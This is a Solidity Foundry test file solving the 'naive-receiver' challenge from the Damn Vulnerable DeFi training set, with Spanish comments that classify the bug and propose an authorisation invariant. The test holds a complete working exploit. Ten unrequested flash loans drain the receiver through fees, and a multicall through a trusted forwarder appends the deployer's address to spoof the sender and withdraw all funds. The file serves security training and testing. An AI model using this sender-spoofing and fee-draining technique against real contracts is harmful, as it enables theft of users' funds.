// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

/*
 * NEXUS Offensive · training/dvd · reto "naive-receiver"
 *
 * CLASE DE BUG: falta de autorización (control de acceso) en dos planos.
 *   (1) El receiver paga un fee fijo por CUALQUIER flashLoan, sin verificar que
 *       su dueño lo haya pedido → un tercero fuerza 10 préstamos y lo vacía vía
 *       fees. (2) El pool confía en un forwarder y lee el remitente de los
 *       últimos 20 bytes de calldata; vía multicall (delegatecall) se falsifica
 *       `_msgSender()` para retirar los depósitos del feeReceiver (deployer).
 *
 * FAMILIA: Flash loan / control de acceso.
 *
 * INVARIANTE QUE LO ATRAPA (NUEVA — hueco del catálogo Capa 2):
 *   Autorización: "los fondos de una cuenta solo se mueven con su
 *   consentimiento". Observable aquí como: el receiver no pidió ningún
 *   préstamo, así que su saldo no debería cambiar. Capa 2 no tenía ninguna
 *   invariante de autorización. => HUECO.
 */
contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    // SETS UP CHALLENGE - DO NOT TOUCH
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);
        weth = new WETH();
        forwarder = new BasicForwarder();
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);
        vm.stopPrank();
    }

    /// @notice INVARIANTE (autorización): el receiver no pidió préstamos, su
    ///         saldo no debería moverse por acción de terceros.
    function _invariant_receiverFundsUntouched() internal view returns (bool) {
        return weth.balanceOf(address(receiver)) == WETH_IN_RECEIVER;
    }

    function test_naiveReceiver() public checkSolvedByPlayer {
        assertTrue(_invariant_receiverFundsUntouched(), "INV debe sostenerse al inicio");

        // Construir un multicall: 10 flashLoans (vacían al receiver vía fees) +
        // 1 withdraw con la direccion del deployer apendada (spoof de _msgSender).
        bytes[] memory calls = new bytes[](11);
        for (uint256 i = 0; i < 10; i++) {
            calls[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, bytes("")));
        }
        calls[10] = abi.encodePacked(
            abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
            deployer // apendado: _msgSender() leerá estos 20 bytes
        );

        // Envolver en una request firmada por el player y ejecutarla (1 sola tx).
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 2_000_000,
            nonce: forwarder.nonces(player),
            data: abi.encodeCall(Multicall.multicall, (calls)),
            deadline: block.timestamp + 1 days
        });
        bytes32 digest =
            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);

        forwarder.execute(request, abi.encodePacked(r, s, v));

        // El receiver fue vaciado por préstamos que nunca pidió → invariante rota.
        console.log("receiver WETH tras el ataque:", weth.balanceOf(address(receiver)));
        assertFalse(_invariant_receiverFundsUntouched(), "INV rota: receiver vaciado sin su consentimiento");
    }

    // CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
    function _isSolved() private view {
        assertLe(vm.getNonce(player), 2);
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
